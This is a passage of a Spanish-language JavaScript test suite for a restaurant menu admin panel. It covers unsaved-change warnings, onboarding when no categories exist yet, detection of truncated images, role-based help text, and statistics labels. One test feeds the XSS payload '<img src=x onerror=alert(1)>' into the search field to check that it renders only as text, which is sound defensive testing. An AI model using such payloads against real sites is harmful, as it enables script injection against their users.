		assert.match(ajustes.match(/async function saveAjustes\(\)\s*\{[\s\S]*?\n\}/)[0], /renderAjustes\(\)/);
		assert.match(ajustes.match(/function renderAjustes\(\)\s*\{[\s\S]*?\n\}/)[0], /renderPedidos\(\)/);
		const pedidos = fs.readFileSync(path.join(PUBLIC, 'pedidos.js'), 'utf8');
		assert.match(pedidos.match(/function renderPedidos\(\)\s*\{[\s\S]*?\n\}/)[0], /actualizarAvisoPedidos\(\)/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Apariencia no pierde cambios en silencio', () => {
	// A1 y A2 en docs/revision-ux.md. Dos guardados a casi cuatro mil píxeles,
	// ninguna señal de lo pendiente, y subir una imagen reiniciaba el formulario.

	function montar() {
		const nodos = {};
		const nodo = () => ({ value: '', checked: false, textContent: '', src: '', style: {}, dataset: {} });
		const $ = id => (nodos[id] ||= nodo());
		const estado = { restaurante: { atributos: {} } };
		const ctx = cargar('index.html', '// ── CAMBIOS SIN GUARDAR EN APARIENCIA', 'async function renderDatosResto() {', {
			document: { getElementById: $ },
			state: estado,
			JSON, String,
			// La forma real de lo que se guarda, reducida a lo que estas pruebas tocan.
			recolectarApariencia: () => ({
				color_primario: $('apColor1').value,
				atributos: { portada_activa: $('apPortadaActiva').checked },
			}),
		});
		const correr = codigo => vm.runInContext(codigo, ctx);
		const foto = () => { correr('fotoApariencia = aparienciaActual(); fotoDatosResto = datosRestoActuales();'); };
		return { ctx, $, estado, correr, foto };
	}

	test('recién pintado, no hay nada pendiente', () => {
		// Si la foto no coincidiera con el formulario, la pestaña diría «cambios
		// sin guardar» nada más abrirla.
		const { ctx, $, foto } = montar();
		$('apColor1').value = '#ff0000';
		$('apNombreResto').value = 'Bonzas';
		foto();
		assert.equal(ctx.hayCambiosApariencia(), false);
		assert.equal(ctx.hayCambiosDatosResto(), false);
	});

	test('cambiar un campo lo marca pendiente junto a su propio botón', () => {
		const { ctx, $, foto } = montar();
		foto();
		$('apColor1').value = '#00ff00';
		ctx.marcarPendientes();
		assert.match($('apArienciaStatus').textContent, /Cambios sin guardar/);
		assert.equal($('apDatosRestoStatus').textContent, '', 'marcó pendiente la sección que no se tocó');
	});

	test('volver al valor guardado quita el aviso', () => {
		const { ctx, $, foto } = montar();
		$('apColor1').value = '#ff0000';
		foto();
		$('apColor1').value = '#00ff00'; ctx.marcarPendientes();
		$('apColor1').value = '#ff0000'; ctx.marcarPendientes();
		assert.equal($('apArienciaStatus').textContent, '');
	});

	test('A1: guardar la apariencia con el nombre sin guardar lo dice junto al botón pulsado', () => {
		// El caso exacto del hallazgo. El aviso de la sección de arriba queda a
		// casi cuatro mil píxeles; tiene que decirse donde está quien pulsó.
		const { ctx, $, correr, foto } = montar();
		foto();
		$('apNombreResto').value = 'Nombre nuevo';
		correr('fotoApariencia = aparienciaActual();');   // se guardó la apariencia
		ctx.pintarGuardado('apArienciaStatus', ctx.hayCambiosDatosResto(), 'Datos del restaurante', 'arriba');
		ctx.marcarPendientes();
		assert.match($('apArienciaStatus').textContent, /Datos del restaurante.*sigue sin guardar/);
		assert.match($('apDatosRestoStatus').textContent, /Cambios sin guardar/);
	});

	test('guardar después la otra sección retira el aviso que ya es falso', () => {
		const { ctx, $, correr, foto } = montar();
		foto();
		$('apNombreResto').value = 'Nombre nuevo';
		correr('fotoApariencia = aparienciaActual();');
		ctx.pintarGuardado('apArienciaStatus', ctx.hayCambiosDatosResto(), 'Datos del restaurante', 'arriba');
		ctx.marcarPendientes();
		// Ahora se guardan también los datos.
		correr('fotoDatosResto = datosRestoActuales();');
		ctx.pintarGuardado('apDatosRestoStatus', ctx.hayCambiosApariencia(), 'Apariencia', 'abajo');
		ctx.marcarPendientes();
		assert.equal($('apArienciaStatus').textContent, '✓ Guardado',
			'la apariencia sigue diciendo que los datos no se han guardado');
	});

	test('un estado que pintó otra función se respeta', () => {
		// «Error al guardar» o «Slug inválido» los pone guardarDatosResto. Que el
		// oyente de la pestaña los borre al siguiente clic sería esconder un error.
		const { ctx, $, foto } = montar();
		foto();
		$('apDatosRestoStatus').textContent = 'Slug inválido: solo minúsculas, números y guiones';
		ctx.marcarPendientes();
		assert.match($('apDatosRestoStatus').textContent, /Slug inválido/);
	});

	test('pintar las imágenes no toca ningún campo del formulario', () => {
		// Antes subir el logo llamaba a renderApariencia, que rellenaba todos los
		// campos desde lo guardado y se llevaba por delante lo que no se guardó.
		const { ctx, $, estado } = montar();
		$('apColor1').value = '#00ff00';   // cambio sin guardar
		estado.restaurante = { logo_url: '/uploads/logos/x.webp', atributos: {} };
		ctx.pintarImagenesApariencia();
		assert.equal($('apColor1').value, '#00ff00', 'se perdió el color sin guardar');
		assert.equal($('apLogoPreview').src, '/uploads/logos/x.webp');
		assert.equal($('apLogoDelBtn').style.display, 'inline-block');
	});

	test('subir la portada la enciende sin inventar un cambio pendiente', () => {
		// El servidor pone portada_activa a true. Si solo se actualizara el
		// interruptor y no la foto de referencia, marcaría un cambio que nadie hizo.
		const { ctx, $, estado, foto } = montar();
		foto();
		estado.restaurante = { atributos: { portada_activa: true, portada_url: '/p.webp' } };
		ctx.sincronizarPortadaActiva();
		assert.equal($('apPortadaActiva').checked, true);
		assert.equal(ctx.hayCambiosApariencia(), false);
	});

	test('los cuatro manejadores de imagen ya no reinician el formulario', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		for (const f of ['handleLogoUpload', 'handleFondoUpload', 'handlePortadaUpload', 'eliminarImagen']) {
			const cuerpo = src.match(new RegExp(`async function ${f}\\([\\s\\S]*?\\n\\}`));
			assert.ok(cuerpo, `no se encontró ${f}`);
			assert.doesNotMatch(cuerpo[0], /renderApariencia\(\)/, `${f} vuelve a llamar a renderApariencia`);
			assert.match(cuerpo[0], /pintarImagenesApariencia\(\)/, `${f} no refresca las vistas previas`);
		}
	});
});

// ═══════════════════════════════════════════════════════════════
describe('el primer día de un restaurante', () => {
	// F1 y F3 en docs/revision-ux.md. Un restaurante recién creado aterrizaba en
	// «Sin productos»; «+ Nuevo producto» abría una ficha que no se podía guardar
	// porque no había categorías, y nada decía dónde crearlas.

	const primerDia = ['// ── EL PRIMER DÍA', 'function renderProducts() {'];

	// ── Qué dice la lista vacía ─────────────────────────────────
	const vacio = () => cargar('index.html', ...primerDia, { String });

	test('sin platos ni categorías: se empieza por la categoría', () => {
		const v = vacio().vacioDeProductos({ total: 0, categorias: 0, busqueda: '', enCategoria: false });
		assert.equal(v.accion, 'categoria');
		assert.match(v.boton, /primera categoría/);
	});

	test('con categorías y sin platos: se añade el primero', () => {
		const v = vacio().vacioDeProductos({ total: 0, categorias: 3, busqueda: '', enCategoria: false });
		assert.equal(v.accion, 'plato');
	});

	test('con cien platos y una búsqueda sin resultados NO manda a crear categorías', () => {
		// La trampa de este cambio. «Sin productos» salía también aquí, y la guía
		// del primer día le diría a Bonzas que cree su primera categoría porque
		// buscó «pizza».
		const v = vacio().vacioDeProductos({ total: 97, categorias: 21, busqueda: 'pizza', enCategoria: false });
		assert.equal(v.accion, null);
		assert.equal(v.boton, null);
		assert.match(v.texto, /pizza/);
	});

	test('una categoría sin platos lo dice así, sin guía de primer día', () => {
		const v = vacio().vacioDeProductos({ total: 97, categorias: 21, busqueda: '', enCategoria: true });
		assert.equal(v.accion, null);
		assert.match(v.titulo, /categoría está vacía/);
	});

	// ── Cómo se pinta ───────────────────────────────────────────
	function domMinimo() {
		const nodo = tag => ({
			tag, children: [], className: '', textContent: '', type: '', onclick: null, style: {},
			set innerHTML(v) { this.children = []; this._html = v; },
			get innerHTML() { return this._html ?? ''; },
			appendChild(c) { this.children.push(c); return c; },
		});
		return { document: { createElement: nodo, getElementById: () => nodo('div') }, nodo };
	}

	test('lo que se buscó se pinta como texto, nunca como HTML', () => {
		// La búsqueda la escribe quien usa el panel. Pintarla con innerHTML
		// convertiría un «<img onerror=…>» en un elemento.
		const { document, nodo } = domMinimo();
		const lista = nodo('div');
		const ctx = cargar('index.html', ...primerDia, {
			String, document,
			state: { productos: [{}], categorias: [{}], catFiltro: 'all' },
			abrirPrimeraCategoria() {}, openNewProductModal() {},
		});
		ctx.pintarVacioProductos(lista, '<img src=x onerror=alert(1)>');
		const caja = lista.children[0];
		const p = caja.children.find(c => c.tag === 'p');
		assert.match(p.textContent, /<img src=x onerror=alert\(1\)>/, 'la búsqueda tendría que verse literal');
		assert.equal(caja.children.some(c => c.tag === 'img'), false);
	});

	test('el botón del primer día abre la categoría con su nota', () => {
		// Corre el abrirPrimeraCategoria real: se comprueba lo que deja hecho —la
		// nota visible y la bandera puesta— y no que alguien lo haya llamado.
		const { document, nodo } = domMinimo();
		const lista = nodo('div');
		const nota = { style: { display: 'none' } };
		let catAbierta = false;
		const ctx = cargar('index.html', ...primerDia, {
			String,
			document: { createElement: document.createElement, getElementById: id => (id === 'catPrimeraNota' ? nota : nodo('div')) },
			state: { productos: [], categorias: [], catFiltro: 'all' },
			openNewCatModal() { catAbierta = true; }, openNewProductModal() {},
		});
		ctx.pintarVacioProductos(lista, '');
		const boton = lista.children[0].children.find(c => c.tag === 'button');
		assert.ok(boton, 'no hay botón en el vacío del primer día');
		boton.onclick();
		assert.equal(catAbierta, true, 'no se abrió la categoría');
		assert.equal(nota.style.display, 'block', 'la nota de «antes del primer plato» no se enseña');
		assert.equal(vm.runInContext('seguirConPlato', ctx), true, 'no quedó marcado que hay que volver al plato');
	});

	// ── «+ Nuevo producto» sin categorías ───────────────────────
	test('sin categorías, «+ Nuevo producto» no abre una ficha que no se puede guardar', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const cuerpo = src.match(/function openNewProductModal\(\)\s*\{[\s\S]*?\n\}/);
		assert.ok(cuerpo);
		// La comprobación va ANTES de tocar la ficha: si se hiciera después, ya
		// se habría abierto y limpiado.
		const posGuarda = cuerpo[0].indexOf('abrirPrimeraCategoria()');
		const posAbrir = cuerpo[0].indexOf("openModal('productModal')");
		assert.ok(posGuarda > 0, 'openNewProductModal no comprueba si hay categorías');
		assert.ok(posGuarda < posAbrir);
	});

	test('la ficha nueva enseña primero los datos esenciales y deja los extras después', () => {
		const codigo = codigoDelPanel();
		const html = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

		for (const [clase, orden] of [
			['producto-nombre', 1], ['producto-categoria', 2], ['producto-precio', 3],
			['producto-disponibilidad', 4], ['producto-foto', 5],
			['producto-descripcion', 7], ['producto-imagenes-adicionales', 9],
		]) {
			assert.match(codigo, new RegExp(`#productModal \\.${clase}\\{order:${orden};\\}`));
		}

		assert.match(html, /Foto del producto[\s\S]*?Agrégala ahora o después/);
		assert.match(html, /Descripción del producto[\s\S]*?Se muestra cuando el cliente abre el producto/);
		assert.match(html, /Descripción corta[\s\S]*?en las cartas de video es el texto principal/);
		assert.match(html, /Imágenes adicionales <span>\(opcional · máx\. 4\)<\/span><\/summary>/);
		assert.doesNotMatch(html, /placeholder="22000"/);
	});

	test('esconder buscador y orden depende del total, no de la lista filtrada', () => {
		// Si dependiera de la lista filtrada, una búsqueda sin resultados haría
		// desaparecer el buscador justo cuando hay que borrarla.
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		assert.match(src, /const sinPlatos = !state\.productos\.length;/);
	});

	test('abrir una categoría por el camino normal baja la bandera', () => {
		// Si alguien cancela la primera categoría y días después crea otra desde
		// «+ Nueva categoría», no debe abrírsele un plato que nunca pidió.
		const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');
		const cuerpo = src.match(/function openNewCatModal\(\)\s*\{[\s\S]*?\n\}/);
		assert.ok(cuerpo);
		assert.match(cuerpo[0], /seguirConPlato = false/);
		assert.match(cuerpo[0], /catPrimeraNota'\)\.style\.display='none'/);
	});

	// ── Guardar la primera categoría vuelve al plato ────────────
	function montarGuardado({ id = '', seguir = false } = {}) {
		const campos = {};
		const $ = k => (campos[k] ||= { value: '', checked: false, disabled: false, textContent: '', style: {}, focus() {} });
		$('editCatId').value = id;
		$('editCatNombre').value = 'Entradas';
		const abiertos = [];
		const estado = {
			restaurante: { id: 'r1' }, pendingCatImgUrl: null,
			categorias: id ? [{ id, nombre: 'Vieja', orden: 0 }] : [],
		};
		const ctx = cargar('index.html',
			[primerDia, ['async function saveCat', '// ── MOVER CATEGORÍA']],
			{
				String, parseInt, document: { getElementById: $ }, state: estado,
				apiFetch: async (metodo) => (metodo === 'POST' ? { id: 'c-nueva', nombre: 'Entradas', orden: 0 } : { nombre: 'Entradas' }),
				renderCatList() {}, renderCatFilter() {}, renderProducts() {}, closeModal() {}, showToast() {}, avisarGuardadoConCarta() {},
				// La regla de qué falta y el marcado del campo viven antes en el
				// archivo, fuera del trozo que carga esta prueba.
				erroresDeCategoria: ({ nombre }) => (String(nombre || '').trim() ? [] : [{ campo: 'editCatNombre', mensaje: 'falta' }]),
				pintarErroresEnCampos() {}, CAMPOS_CATEGORIA: ['editCatNombre'],
				openNewProductModal() { abiertos.push('producto'); },
			});
		if (seguir) vm.runInContext('seguirConPlato = true;', ctx);
		return { ctx, $, abiertos };
	}

	test('crear la primera categoría desde «+ Nuevo producto» abre el plato con ella elegida', async () => {
		const { ctx, $, abiertos } = montarGuardado({ seguir: true });
		await ctx.saveCat();
		assert.deepEqual(abiertos, ['producto'], 'no se volvió a la ficha del plato');
		assert.equal($('editCategoria').value, 'c-nueva', 'la categoría recién creada no quedó elegida');
		assert.equal(vm.runInContext('seguirConPlato', ctx), false, 'la bandera no se consumió');
	});

	test('crear una categoría por el camino normal no abre ningún plato', async () => {
		const { ctx, abiertos } = montarGuardado({ seguir: false });
		await ctx.saveCat();
		assert.deepEqual(abiertos, []);
	});

	test('editar una categoría nunca encadena el plato, aunque la bandera esté puesta', async () => {
		const { ctx, abiertos } = montarGuardado({ id: 'c1', seguir: true });
		await ctx.saveCat();
		assert.deepEqual(abiertos, []);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('los dos desplegables de orden no se confunden', () => {
	// P1 en docs/revision-ux.md. A 29 px uno del otro, uno ordenaba la lista del
	// panel y el otro publicaba el orden de la carta; las etiquetas se
	// diferenciaban en la palabra «de».
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	test('cada opción del de la lista dice que es solo para ver aquí', () => {
		const sel = src.match(/<select[^>]*id="sortSelect"[\s\S]*?<\/select>/)[0];
		const opciones = [...sel.matchAll(/<option[^>]*>([^<]*)</g)].map(m => m[1]);
		assert.ok(opciones.length >= 5);
		for (const o of opciones) assert.match(o, /^Ver aquí:/, `«${o}» no dice que es solo una vista`);
	});

	test('el de la carta avisa de que publica', () => {
		const tarjeta = src.match(/id="ordenProductos"[\s\S]*?id="ordenProductosAyuda"/)[0];
		assert.match(tarjeta, /aria-describedby="ordenProductosAviso"/);
		assert.match(tarjeta, /id="ordenProductosAviso"[^>]*>\s*Así ven tus clientes/);
		assert.match(src, /Orden en tu carta/);
	});

	function montar({ guardado = 'precio_asc', elegido = 'nombre_az', falla = false } = {}) {
		const campos = {};
		const $ = k => (campos[k] ||= { value: '', textContent: '', style: {} });
		$('ordenProductos').value = elegido;
		const llamadas = [], avisos = [];
		const state = { restaurante: { id: 'r1', atributos: { orden_productos: guardado } }, productos: [], categorias: [], catFiltro: 'all' };
		const ctx = cargar('index.html', 'function ordenProductosModo', '// Reasigna 0,1,2', {
			document: { getElementById: $ }, state, setTimeout() {},
			apiFetch: async (metodo, url, body) => {
				llamadas.push(body);
				if (falla) throw new Error('sin red');
				return { id: 'r1', atributos: { orden_productos: body.atributos.orden_productos } };
			},
			renderProducts() {}, enTandas: async () => {},
			showToast: (msg, tipo, accion) => avisos.push({ msg, tipo, accion }),
		});
		return { ctx, $, llamadas, avisos, state };
	}

	test('al publicar un orden se dice, con Deshacer, y Deshacer vuelve al anterior', async () => {
		const { ctx, $, llamadas, avisos } = montar();
		await ctx.guardarOrdenProductos();
		assert.equal(avisos.length, 1);
		assert.match(avisos[0].msg, /clientes/);
		assert.ok(avisos[0].accion, 'el aviso no ofrece deshacer');
		avisos[0].accion.alPulsar();
		await new Promise(r => setImmediate(r));
		assert.deepEqual(llamadas.map(b => b.atributos.orden_productos), ['nombre_az', 'precio_asc']);
		assert.equal($('ordenProductos').value, 'precio_asc');
		assert.equal(avisos[1].accion, undefined, 'deshacer no debe ofrecer otro deshacer');
	});

	test('si no se guarda, el desplegable vuelve a lo que de verdad está publicado', async () => {
		const { ctx, $ } = montar({ falla: true });
		await ctx.guardarOrdenProductos();
		assert.equal($('ordenProductos').value, 'precio_asc');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('una foto cortada no se sube ni se anuncia en verde', () => {
	// SU2 en docs/revision-ux.md. Probado el 10/09/2026 con un JPEG cortado al
	// 10 %: el navegador lo decodificaba a medias y el panel decía «✓ Lista para
	// guardar» encima de una foto blanca en sus nueve décimas partes.
	const { imagenIncompleta } = cargar('index.html', 'function imagenIncompleta', 'const MENSAJE_IMAGEN_INCOMPLETA', {});
	const u8 = (...partes) => Uint8Array.from(partes.flat());
	const seg = (marca, datos) => [0xFF, marca, ((datos.length + 2) >> 8) & 0xFF, (datos.length + 2) & 0xFF, ...datos];

	// Un JPEG con la forma de uno de verdad: APP0, datos con FF 00 de relleno
	// dentro de la imagen, y su FF D9 al final.
	const SOI = [0xFF, 0xD8], EOI = [0xFF, 0xD9];
	const escaneo = [0x12, 0xFF, 0x00, 0x34, 0x56, 0xFF, 0xD0, 0x78];   // FF00 relleno, FFD0 un RST
	const jpeg = (...cola) => u8(SOI, seg(0xE0, [0x4A, 0x46, 0x49, 0x46, 0]), seg(0xDA, [1, 2, 3]), escaneo, ...cola);

	test('un JPEG entero pasa', () => {
		assert.equal(imagenIncompleta(jpeg(EOI)), false);
	});

	test('un JPEG cortado dentro de la imagen se detecta', () => {
		assert.equal(imagenIncompleta(jpeg()), true);
	});

	test('un JPEG cortado antes de empezar la imagen se detecta', () => {
		assert.equal(imagenIncompleta(u8(SOI, seg(0xE0, [1, 2, 3]))), true);
	});

	test('la miniatura EXIF, con su propio fin, no hace pasar por entera una foto cortada', () => {
		// La trampa de buscar FF D9 a lo bruto: la miniatura lo trae dentro de APP1.
		const miniatura = [0x45, 0x78, 0x69, 0x66, 0, 0, ...SOI, 0xFF, 0xDA, 0, 3, 9, 9, ...EOI];
		const cortada = u8(SOI, seg(0xE1, miniatura), seg(0xDA, [1, 2, 3]), escaneo);
		assert.equal(imagenIncompleta(cortada), true);
		assert.equal(imagenIncompleta(u8(cortada, EOI)), false);
	});

	test('una foto en movimiento de Android, con un video pegado detrás, pasa', () => {
		// Esas fotos llevan un MP4 después del FF D9. Mirar solo los últimos bytes
		// las rechazaría todas.
		const video = [0, 0, 0, 0x18, 0x66, 0x74, 0x79, 0x70, 0x6D, 0x70, 0x34, 0x32, ...new Array(64).fill(7)];
		assert.equal(imagenIncompleta(jpeg(EOI, video)), false);
	});

	const PNG_FIRMA = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];
	const IEND = [0, 0, 0, 0, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82];
	test('un PNG con IEND pasa; sin él, se detecta', () => {
		assert.equal(imagenIncompleta(u8(PNG_FIRMA, new Array(40).fill(1), IEND)), false);
		assert.equal(imagenIncompleta(u8(PNG_FIRMA, new Array(40).fill(1))), true);
	});

	const webp = (declarado, real) => {
		const b = new Uint8Array(real);
		b.set([0x52, 0x49, 0x46, 0x46, declarado & 0xFF, (declarado >> 8) & 0xFF, 0, 0, 0x57, 0x45, 0x42, 0x50]);
		return b;
	};
	test('un WebP que mide lo que declara pasa; uno más corto, se detecta', () => {
		assert.equal(imagenIncompleta(webp(92, 100)), false);
		assert.equal(imagenIncompleta(webp(492, 100)), true);
	});

	test('lo que no reconoce no lo juzga', () => {
		// Un GIF, un archivo raro: aquí no se valida, se avisa del caso conocido.
		assert.equal(imagenIncompleta(u8([0x47, 0x49, 0x46, 0x38, 0x39, 0x61])), false);
		assert.equal(imagenIncompleta(u8([])), false);
	});

	test('compressImage la rechaza antes de decodificar, con un mensaje que dice qué hacer', async () => {
		let decodificada = false;
		const ctx = cargar('index.html', [['let _haceWebp', 'async function uploadImg']], {
			// Si llegara a leerse, falla en el acto: una promesa colgada deja la
			// prueba cancelada, no fallida, y la regresión pasaría sin ruido.
			FileReader: class { readAsDataURL() { decodificada = true; setTimeout(() => this.onerror?.(), 0); } },
			Image: class {}, document: { createElement: () => ({}) },
		});
		const archivo = { name: 'plato.jpg', type: 'image/jpeg', arrayBuffer: async () => jpeg().buffer };
		await assert.rejects(ctx.compressImage(archivo, 800, .82), err => {
			assert.match(err.message, /incompleta/);
			assert.match(err.message, /descargarla|elige otra/);
			return true;
		});
		assert.equal(decodificada, false, 'se intentó abrir la foto rota en vez de rechazarla antes');
	});
});

// ═══════════════════════════════════════════════════════════════
describe('los avisos no mandan al cliente a pestañas que no ve', () => {
	// CL1 en docs/revision-ux.md. «Súbelo en la pestaña Apariencia» y «Actívalos en
	// Apariencia» se le enseñaban al restaurante, que no tiene esa pestaña.
	const src = fs.readFileSync(path.join(PUBLIC, 'index.html'), 'utf8');

	function montar() {
		const nodos = {};
		const nodo = () => ({
			_t: '', hijos: [], style: {},
			// textContent borra los hijos, como en un navegador
			set textContent(v) { this._t = v; this.hijos = []; }, get textContent() { return this._t; },
			appendChild(h) { this.hijos.push(h); return h; },
		});
		const ctx = cargar('index.html', '// ── AYUDA QUE DEPENDE DE QUIÉN MIRA', '// Mismo criterio que la carta (soloDigitos)', {
			Object, encodeURIComponent,
			document: {
				getElementById: id => (nodos[id] ||= nodo()),
				createElement: () => nodo(),
			},
		});
		return { ctx, nodos };
	}

	test('al cliente no se le nombra Apariencia, y se le da el WhatsApp', () => {
		const { ctx, nodos } = montar();
		ctx.pintarAyudaSegunQuienMira(false);
		for (const id of ['qrSinLogo']) {
			assert.doesNotMatch(nodos[id].textContent, /Apariencia/, `${id} manda al cliente a Apariencia`);
			const enlace = nodos[id].hijos[0];
			assert.ok(enlace, `${id} no ofrece a quién pedirlo`);
			assert.match(enlace.href, /^https:\/\/wa\.me\/573151182283\?text=/);
			assert.equal(enlace.rel, 'noopener');
		}
	});

	test('al superadmin sí se le dice dónde está, sin enlace', () => {
		const { ctx, nodos } = montar();
		ctx.pintarAyudaSegunQuienMira(false);   // aunque antes se pintara para un cliente
		ctx.pintarAyudaSegunQuienMira(true);
		assert.match(nodos.qrSinLogo.textContent, /pestaña Superadmin/);
		assert.equal(nodos.qrSinLogo.hijos.length, 0);
	});

	test('el aviso de filtros vacíos manda a Ajustes, igual para los dos', () => {
		// 15/09/2026: los filtros se activan en Ajustes, que ven los dos roles. Ya no
		// hay que pedirlos por WhatsApp ni una rama para cada uno.
		const { ctx, nodos } = montar();
		ctx.pintarAyudaSegunQuienMira(false);
		assert.equal(nodos.editFiltrosVacio, undefined, 'la ayuda por rol ya no lo toca');
		assert.match(src, /<div id="editFiltrosVacio"[^>]*>[^<]*pestaña Ajustes → Filtros y etiquetas/);
		assert.doesNotMatch(src, /Los activamos nosotros/);
	});

	test('se pinta donde se decide si se ve Apariencia', () => {
		const i = src.indexOf("document.getElementById('tabBtnApariencia').style.display = state.rol === 'admin'");
		assert.ok(i > 0);
		assert.match(src.slice(i, i + 250), /pintarAyudaSegunQuienMira\(state\.rol === 'admin'\)/);
	});

	test('la personalización usa la misma regla que los toppings de Ajustes', () => {
		// «Créalos en…» solo es verdad si el catálogo está a la vista. Con reglas
		// distintas, desde PE3 un Topnav con el interruptor puesto veía el aviso
		// con los toppings escondidos.
		const pers = src.match(/function renderPersonalizacion\(\) \{[\s\S]*?\n\}/)[0];
		const ajustes = fs.readFileSync(path.join(PUBLIC, 'ajustes.js'), 'utf8');
		assert.match(pers, /cartaTieneCarrito\(/);
		assert.match(ajustes.match(/function hayQueEnsenarToppings\(\) \{[\s\S]*?\n\}/)[0], /carritoEnPantalla\(\)/);
		assert.match(ajustes.match(/function carritoEnPantalla\(\) \{[\s\S]*?\n\}/)[0], /cartaTieneCarrito\(/);
		assert.doesNotMatch(pers, /attr\.nav === 'carrito'/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('con «Activa» apagada, los destinos de la promoción se ven sin efecto', () => {
	// B2 en docs/revision-ux.md. Los tres interruptores eran iguales, y apagando
	// «Activa» seguían «En la carta» y «En el televisor» encendidos a la vista.
	const src = codigoDelPanel();
	const { atenuarDestinos } = cargar('promocion.js', 'function atenuarDestinos', 'function programacionDelFormulario', {});

	function caja(activa) {
		const destinos = [{ style: {}, title: '' }, { style: {}, title: '' }];
		return {
			destinos,
			querySelector: sel => (sel === '.p-activa' ? { checked: activa } : null),
			querySelectorAll: sel => (sel === '.p-destino' ? destinos : []),
		};
	}

	test('apagada: los dos destinos atenuados y con el motivo', () => {
		const c = caja(false);
		atenuarDestinos(c);
		for (const d of c.destinos) {
			assert.equal(d.style.opacity, '0.4');
			assert.match(d.title, /borrador/);
		}
	});

	test('encendida: vuelven a verse normales', () => {
		const c = caja(false);
		atenuarDestinos(c);
		c.querySelector = sel => (sel === '.p-activa' ? { checked: true } : null);
		atenuarDestinos(c);
		for (const d of c.destinos) {
			assert.equal(d.style.opacity, '');
			assert.equal(d.title, '');
		}
	});

	test('los dos destinos llevan la marca, y «Activa» no', () => {
		const t = src.match(/function tarjetaDePromo\(p\) \{[\s\S]*?\n\}/)[0];
		assert.match(t, /class="p-destino form-check"><label class="toggle"><input type="checkbox" class="p-popup">/);
		assert.match(t, /class="p-destino p-tv-fila form-check"><label class="toggle"><input type="checkbox" class="p-tv">/);
		assert.doesNotMatch(t, /p-destino[^>]*><label class="toggle"><input type="checkbox" class="p-activa">/);
	});

	test('se repinta cada vez que cambia algo de la tarjeta', () => {
		// nota() se llama al pintar y en cada onchange de los interruptores.
		const t = src.match(/function tarjetaDePromo\(p\) \{[\s\S]*?\n\}/)[0];
		assert.match(t, /const nota = \(\) => \{\s*atenuarDestinos\(caja\);/);
		assert.match(t, /for \(const c of \['p-activa', 'p-popup', 'p-tv'/);
	});

	test('atenuar no los deshabilita: se pueden dejar preparados antes de encender', () => {
		const cuerpo = src.match(/function atenuarDestinos\(caja\) \{[\s\S]*?\n\}/)[0];
		assert.doesNotMatch(cuerpo, /disabled/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('Destacados · alta sin explorador agresivo y desde un producto', () => {
	const panel = codigoDelPanel();
	const destacados = fs.readFileSync(path.join(PUBLIC, 'promocion.js'), 'utf8');

	test('la pestaña habla de destacados y el botón abre una ventana', () => {
		assert.match(panel, /switchTab\('promo',this\)">Destacados<\//);
		assert.match(panel, /id="btnNuevaPromo" onclick="abrirNuevoDestacado\(\)"/);
		assert.doesNotMatch(panel, /id="btnNuevaPromo" onclick="document\.getElementById\('promoFileInput'\)\.click\(\)"/);
		assert.match(panel, /id="destacadoModal"/);
		assert.match(panel, /Usar un producto de mi carta/);
	});

	test('las dos rutas crean un borrador, nunca algo publicado de inmediato', () => {
		const desdeProducto = destacados.match(/async function crearDestacadoDesdeProducto[\s\S]*?\n\}/)[0];
		const desdeImagen = destacados.match(/async function crearDestacadoConImagen[\s\S]*?\n\}/)[0];
		assert.match(desdeProducto, /imagen_url: producto\.imagen_url/);
		assert.match(desdeProducto, /nombre: producto\.nombre \|\| '', precio: producto\.precio \|\| ''/);
		assert.match(desdeProducto, /activa: false, \.\.\.destinosDeNuevoDestacado\(\)/);
		assert.match(desdeImagen, /activa: false, \.\.\.destinosDeNuevoDestacado\(\)/);
	});

	test('usar un producto no lo modifica', () => {
		const fn = destacados.match(/async function crearDestacadoDesdeProducto[\s\S]*?\n\}/)[0];
		assert.match(fn, /POST', '\/api\/promociones'/);
		assert.doesNotMatch(fn, /\/api\/productos/);
	});
});

// ═══════════════════════════════════════════════════════════════
describe('las estadísticas no concluyen más de lo que los datos permiten', () => {
	// E1, E2, E3, M6 y B3 en docs/revision-ux.md: «Tasa de interacción: 125 %»,
	// porcentajes redondos sobre cinco eventos, y «Platos que nadie abrió» con
	// cero visitas o con 27 visitas sobre 97 platos.
	const nodo = () => ({
		style: {}, textContent: '', innerHTML: '', className: '', hijos: [],
		appendChild(h) { this.hijos.push(h); return h; },
	});
	function montar(productos = [], categorias = []) {
		const nodos = {};
		const ctx = cargar('estadisticas.js', [
			['// ── MÁS AGREGADOS AL CARRITO', '// ── HORAS DE MAYOR TRÁFICO'],
			['// ── PLATOS QUE NADIE ABRIÓ', 'function renderKpis'],
		], {
			Object, String, Math,
			state: { productos, categorias },
			esc: s => String(s),
			document: { getElementById: id => (nodos[id] ||= nodo()), createElement: () => nodo() },
		});
		return { ctx, nodos };
	}
	const texto = n => n.textContent + n.innerHTML + n.hijos.map(h => h.textContent).join('');

	// ── E1 ──────────────────────────────────────────────────────
	test('clics por visita en vez de un porcentaje que pasa de 100', () => {
		const { ctx } = montar();
		assert.equal(ctx.clicsPorVisita(5, 4), '1,3');
		assert.equal(ctx.clicsPorVisita(19, 27), '0,7');
		assert.doesNotMatch(ctx.clicsPorVisita(5, 4), /%/);
	});

	test('sin visitas no se inventa un 0 rotundo', () => {
		assert.equal(montar().ctx.clicsPorVisita(0, 0), '—');
	});

	test('el indicador ya no se llama tasa ni lleva %', () => {
		const src = fs.readFileSync(path.join(PUBLIC, 'estadisticas.js'), 'utf8');
		const kpis = src.match(/function renderKpis\(data\) \{[\s\S]*?\n\}/)[0];
		assert.doesNotMatch(kpis, /tasaInteraccion|Tasa de interacción/);
		assert.match(kpis, /Clics por visita/);
	});

	// ── E2 ──────────────────────────────────────────────────────
	const datosCarrito = (totalClics, clicsPlato) => ({
